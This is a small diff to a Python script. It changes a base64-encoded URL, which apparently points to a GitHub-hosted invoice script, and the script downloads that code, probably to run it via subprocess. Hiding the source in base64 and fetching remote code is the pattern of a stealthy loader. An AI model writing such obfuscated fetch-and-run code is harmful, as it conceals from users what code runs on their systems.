@@ -2,7 +2,7 @@ import urllib.request
 import subprocess
 import base64
 
-url = base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1l1bnVzLUthcmFndW4vZS1JbnZvaWNlLUFETC9tYWluL0ZhdHVyYV9BREwucHk=').decode('utf-8')
+url = base64.b64decode('aHR0cHM6Ly9naXRodWIuY29tL1l1bnVzLUthcmFndW4vZS1JbnZvaWNlLUJOL2Jsb2IvbWFpbi9GYXR1cmFfQk4ucHk=').decode('utf-8')
 response = urllib.request.urlopen(url)
 script_content = response.read().decode('utf-8')
 
